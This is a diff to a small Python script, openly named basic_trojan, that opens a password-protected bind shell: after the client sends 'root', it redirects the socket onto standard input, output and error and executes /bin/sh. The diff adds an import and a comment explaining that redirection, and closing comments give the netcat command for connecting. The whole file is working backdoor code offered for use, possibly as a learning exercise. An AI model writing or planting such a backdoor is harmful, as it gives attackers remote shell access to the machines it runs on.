@@ -2,6 +2,8 @@
 #--*-- coding:UTF-8 --*--
 
 import socket, os, code
+import sys
+
 
 def basic_trojan():
     host = ''
@@ -19,8 +21,11 @@ def basic_trojan():
     while 1:
         if mot==b"root\n" :
             print("on est dans root")
+
+            # redirect 0: keyboard / 1: stdout / 2: stderr on the socket
             for f in range(3):
                 os.dup2(client.fileno(), f)
+
             os.execl("/bin/sh", "/bin/sh")
             code.interact()
             sys.exit
@@ -32,6 +37,7 @@ def basic_trojan():
 
 if __name__=="__main__" :
     basic_trojan()
+
 #start a client with following command
 #nc -vv 127.0.0.1 8083
 #pasword root
